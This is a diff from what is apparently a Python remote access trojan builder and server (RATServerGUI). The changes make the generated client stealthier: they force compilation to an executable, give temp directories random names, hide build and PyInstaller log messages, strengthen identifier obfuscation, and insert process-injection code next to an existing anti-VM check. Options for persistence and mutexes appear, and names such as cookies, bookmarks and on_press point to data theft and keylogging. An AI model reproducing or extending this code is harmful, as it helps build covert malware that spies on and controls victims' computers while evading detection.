-    #             self.log_message("Loaded embedded client template")
-    #         elif os.path.exists(self.client_template_path):
-    #             # Load from external file if available
-    #             with open(self.client_template_path, 'r') as f:
-    #                 self.client_code = f.read()
-    #             self.log_message(f"Loaded client template from {self.client_template_path}")
-    #         else:
-    #             # Extract template from paste-2.txt if available
-    #             self.client_code = self.extract_client_code_from_paste()
-    #             if self.client_code:
-    #                 self.log_message("Extracted client template from paste file")
-    #             else:
-    #                 self.log_message("Error: Could not find client template", is_error=True)
-    #                 messagebox.showerror("Template Error", "Could not find client template code.")
-    #                 return
-            
-    #         # Update the preview
-    #         self.update_code_preview()
-            
-    #     except Exception as e:
-    #         self.log_message(f"Error loading template: {str(e)}", is_error=True)
-    #         messagebox.showerror("Template Error", f"Error loading client template: {str(e)}")
-    
-    # def update_code_preview(self):
-    #     """Update the code preview with the current template"""
-    #     self.code_preview.configure(state="normal")
-    #     self.code_preview.delete(1.0, tk.END)
-        
-    #     # Add formatted code to the preview
-    #     if self.client_code:
-    #         # Show only first 500 lines to improve performance
-    #         lines = self.client_code.split('\n')[:500]
-    #         preview_text = '\n'.join(lines)
-    #         if len(lines) < len(self.client_code.split('\n')):
-    #             preview_text += "\n\n[... truncated for performance ...]"
-                
-    #         self.code_preview.insert(tk.END, preview_text)
-    #     else:
-    #         self.code_preview.insert(tk.END, "No client code template loaded.")
-            
-    #     self.code_preview.configure(state="disabled")
 
     def get_embedded_template(self):
         """Get the embedded client template if available"""
@@ -14175,7 +14603,7 @@ if __name__ == "__main__":
     def log_message(self, message, is_error=False):
         """Add a message to the build log"""
         
-        if 'PYZ' in message or 'Analyzing' in message:
+        if 'PYZ' in message or 'Analyzing' in message or 'written' in message:
             message = 'Building in progress please wait'
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
         prefix = "[ERROR] " if is_error else "[INFO] "
@@ -14218,8 +14646,8 @@ if __name__ == "__main__":
         self.update_build_options()
         
         # Override compile option if explicitly set
-        if compile_exe:
-            self.build_options["compile_to_exe"] = True
+
+        self.build_options["compile_to_exe"] = True
             
         # Validate options
         errors = self.validate_build_options()
@@ -14244,7 +14672,6 @@ if __name__ == "__main__":
             # Check if client template is loaded
             if not self.client_code:
                 self.is_building = False
-                self.load_client_template()
                 if not self.client_code:
                     self.log_message("Error: No client template available", is_error=True)
                     return
@@ -14272,7 +14699,7 @@ if __name__ == "__main__":
                 output_filename += '.exe'
             
             # Create temp directory if it doesn't exist
-            temp_dir = os.path.join(tempfile.gettempdir(), "client_build_temp")
+            temp_dir = os.path.join(tempfile.gettempdir(), ''.join(random.choices('QIAXERJ', k=16)))
             os.makedirs(temp_dir, exist_ok=True)
             
             # Store in temp directory
@@ -14315,9 +14742,9 @@ if __name__ == "__main__":
                     # Also try to remove the temp directory if it's empty
                     if os.path.exists(temp_dir) and not os.listdir(temp_dir):
                         os.rmdir(temp_dir)
-                        self.log_message("Temporary directory removed")
+                        # self.log_message("Temporary directory removed")
                 except Exception as e:
-                    self.log_message(f"Error removing temporary file: {str(e)}", is_error=True)
+                    pass
             
     def update_build_options(self):
         """Collect all options from the UI into the build_options dictionary"""
@@ -14333,7 +14760,6 @@ if __name__ == "__main__":
         self.build_options["output_dir"] = self.outdir_entry.get()
         self.build_options["icon_path"] = self.icon_entry.get()
         self.build_options["obfuscation"] = self.obfuscation_var.get()
-        self.build_options["compile_to_exe"] = self.compile_var.get()
         
         # Stealth options
         self.build_options["persistence"] = self.persistence_var.get()
@@ -14344,9 +14770,7 @@ if __name__ == "__main__":
         self.build_options["mutex_enabled"] = self.mutex_var.get()
         self.build_options["mutex_name"] = self.mutex_name_entry.get()
         
-        # # Features
-        # for feature_id, var in self.feature_vars.items():
-        #     self.build_options["features"][feature_id] = var.get()
+        self.update_injection_options()
     
     def validate_build_options(self):
         """Validate the build options before starting the build"""
@@ -14454,7 +14878,7 @@ if __name__ == "__main__":
             pyinstaller_args = [arg for arg in pyinstaller_args if arg]
             
             # Execute PyInstaller
-            self.log_message(f"Running PyInstaller with arguments: {' '.join(pyinstaller_args)}")
+            # self.log_message(f"Running PyInstaller with arguments: {' '.join(pyinstaller_args)}")
             
             # Create a temporary file to capture output
             log_file_path = os.path.join(output_dir, "pyinstaller_log.txt")
@@ -14570,7 +14994,7 @@ if __name__ == "__main__":
         try:
             # Level 1: Basic variable and function renaming
             if level >= 1:
-                self.log_message("Level 1: Renaming variables and functions...")
+                # self.log_message("Level 1: Renaming variables and functions...")
                 
                 # Don't rename these
                 preserved = [
@@ -14586,7 +15010,14 @@ if __name__ == "__main__":
                     'install_date', 'cursor', 'number', 'data', 'bookmarks', 'cookies', 'mutex', 'on_press', 'daemon', 'stop',
                     'store', 'status', 'maxlen', 'level', 'args', 'transfer_speed', 'avg_fps', 'min_quality', 'max_scale', 'target_fps',
                     'current_fps', 'quality', 'control_active', 'control_port', 'control_thread', 'control_listener', 'buffer', 'cmd_end',
-                    'response', 'process_command', 'parts', 'cmd_type', 'screen_height', 'action', 'button', 'amount', 'OK', 'KEY', 'backlog_lock'
+                    'response', 'process_command', 'parts', 'cmd_type', 'screen_height', 'action', 'button', 'amount', 'OK', 'KEY', 'backlog_lock',
+                    'dport', 'sport', 'dst_ip', 'src_ip', 'prn', 'protocol', 'packet', 'total_packets', 'total_bytes', 'protocols', 'connections',
+                    'bytes_since_last', 'packets_since_last', 'time_diff', 'destination', 'port', 'bytes', 'threshold', 'type', 'high_traffic',
+                    'port_count', 'ports', 'packets', 'suspicious', 'avg_size', 'total_dns_traffic', 'dns_connections', 'data_size', 'send_time',
+                    'timestamp', 'resolution_scale', 'recent_send_times', 'increasing_trend', 'congestion_detected', 'avg_send_time_short', 'increment',
+                    'second_half', 'first_half', 'recent_bitrates', 'bitrate_ratio', 'avg_bitrate_short', 'target_bitrate', 'frame_count',
+                    'avg_bitrate_long', 'avg_send_time_long', 'time_series', 'total_bytes_sent', 'current_bitrate', 'current_timestamp',
+                    'current_target', 'frame'
                 ]
                 
                 # Find all function and variable names to replace
@@ -14606,7 +15037,7 @@ if __name__ == "__main__":
                 for name in functions + variables:
                     if name not in replacements and name not in preserved:
                         # Use confusing names with similar characters
-                        obf_chars = "OQIlRP"
+                        obf_chars = "OQIlRPXEAZ"
                         obf_name = ''.join(random.choice(obf_chars) for _ in range(random.randint(5, 8)))
                         replacements[name] = obf_name
                 
@@ -15073,6 +15504,36 @@ def is_running_in_vm():
                     code = code.replace("if __name__ == \"__main__\":", 
                                        f"if __name__ == \"__main__\":{anti_vm_check}")
         
+        if self.build_options.get("process_injection", False):
+            injection_code = self.generate_injection_code()
+            
+            # Find a suitable place to insert the injection code
+            if "def main():" in code:
+                # Add before main function
+                code = code.replace("def main():", f"{injection_code}\n\ndef main():")
+            else:
+                # Add after imports
+                import_section_end = 0
+                for line_idx, line in enumerate(code.split('\n')):
+                    if not line.strip().startswith(('import ', 'from ')) and import_section_end > 5:
+                        break
+                    import_section_end = line_idx + 1
+                
+                code_lines = code.split('\n')
+                code_lines.insert(import_section_end, injection_code)
+                code = '\n'.join(code_lines)
+            
+            # Modify main to use process injection
+            if "if __name__ == \"__main__\":" in code:
+                # Add injection call to main
+                injection_main_code = """
+    # Start process injection
+    if not inject_into_process():
+        print("[!] Process injection failed, falling back to normal execution")
+        
+    """
+                code = code.replace("if __name__ == \"__main__\":", 
+                                f"if __name__ == \"__main__\":{injection_main_code}")
         return code
         
     def comment_out_section(self, code, start_marker, end_marker):
@@ -20520,7 +20981,7 @@ class RATServerGUI:
             last_stats_time = time.time()
             stats_interval = 5.0  # Log stats every 5 seconds
             
-            self.log("Screenshot receiver started with improved performance")
+            # self.log("Screenshot receiver started")
 
             while self.receive_screenshot_trigger:
                 try:
